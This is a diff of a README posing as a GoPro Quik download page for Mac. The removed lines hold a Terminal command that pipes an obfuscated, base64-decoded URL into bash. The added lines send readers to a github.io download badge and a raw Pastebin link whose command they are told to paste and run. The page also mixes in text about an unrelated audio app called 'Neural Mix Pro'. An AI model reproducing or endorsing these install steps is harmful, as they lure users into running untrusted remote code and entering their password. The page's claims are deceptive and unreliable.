@@ -1,22 +1,34 @@
 # GoPro Quik Mac Download
 
+<div align="center">
+  
 ![GoPro Quik Mac Screenshot](https://static.gopro.com/assets/blta2b8522e5372af40/bltcf8b58984c9d9a90/64dccf63b1e7d17bebfe861f/37-pdp-H12BCE-375.png)
+
+</div>
+
+<div align="center">
+
+[![📹 DOWNLOAD: GoPro Quick (Mac)](https://img.shields.io/badge/📹%20DOWNLOAD:%20GoPro%20Quick%20(Mac)-0077c8?style=for-the-badge&logo=gopro&logoColor=white)](https://jumakas-olftol-mang.github.io/.github/gopro)
+
+
+</div>
 
 ---
 
-## 📦 How to Install
+## Installation via .dmg:
 
-# Installation via a command in the terminal:
+1. Download the `.dmg` installer using the button above.  
+2. Open it and drag **Neural Mix Pro** into your Applications folder.  
+3. Launch the app and start separating tracks into vocals, instrumentals, and beats.  
 
-1. Copy the installation command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQxMC9pbnN0YWxsLnNo | base64 -d))"
-```
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
+## Installation via a command in the terminal:
 
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+1. Go to the Pastebin link below and copy the command:  
 
+   https://pastebin.com/raw/c78sWrrL  
+
+2. Open your terminal, paste the command, and run it.
+3. 
 ---
 
 ## 📦 What is GoPro Quik for Mac?
@@ -29,16 +41,16 @@ Built specifically for macOS, **GoPro Quik** integrates smoothly with your MacBo
 
 ---
 
-## 🌟 Key Features & Benefits
+## Key Features  
 
-- 🎬 **One-Click Edits** — Auto-generate videos with synced music and stylish cuts.
-- 🪄 **Smart Highlight Detection** — Quik finds your best shots automatically.
-- 🎵 **Built-in Music Library** — Choose from royalty-free soundtracks.
-- 🖥️ **macOS Optimized** — Native support for Intel and Apple Silicon (M1/M2/M3).
-- 📂 **Media Management** — Organize, trim, and share your footage with ease.
-- ⚡ **Fast File Transfers** — Quickly import videos and photos from your GoPro.
-- 🎨 **Manual Edits** — Full creative control with trim, crop, text, and filters.
-- 📤 **Export in HD/4K** — Share on YouTube, Instagram, or save to local drive.
+| Feature                        | Description                                                                 |
+|--------------------------------|-----------------------------------------------------------------------------|
+| 🎤 Vocal Isolation             | Separate vocals from background music for remixes and karaoke               |
+| 🥁 Drum Extraction             | Isolate or remove beats for mashups and re-arrangements                     |
+| 🎹 Instrument Separation       | Split harmonics like piano, guitar, and synths with precision               |
+| ⚡ Real-Time Processing        | AI-powered stem separation with minimal latency                             |
+| 📂 Stem Export                 | Save vocals, instrumentals, and beats as separate audio files               |
+| 💻 macOS Compatibility         | Fully optimized for Intel and Apple Silicon Macs                            |
 
 ---
 
